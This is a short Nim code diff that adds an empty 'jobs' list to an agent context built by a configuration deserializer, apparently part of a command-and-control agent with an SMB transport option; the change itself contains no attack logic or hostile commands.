@@ -52,7 +52,8 @@ proc deserializeConfiguration(config: string): AgentCtx =
             agentPublicKey: agentKeyPair.publicKey,
             profile: parseString(unpacker.getDataWithLengthPrefix()),
             registered: false,
-            links: initTable[uint32, uint32]()
+            links: initTable[uint32, uint32](),
+            jobs: @[]
         ) 
 
     when defined(TRANSPORT_SMB): 
@@ -81,7 +82,8 @@ proc deserializeConfiguration(config: string): AgentCtx =
             agentPublicKey: agentKeyPair.publicKey,
             profile: parseString(unpacker.getDataWithLengthPrefix()),
             registered: false,
-            links: initTable[uint32, uint32]()
+            links: initTable[uint32, uint32](),
+            jobs: @[]
         ) 
 
     wipeKey(agentKeyPair.privateKey)
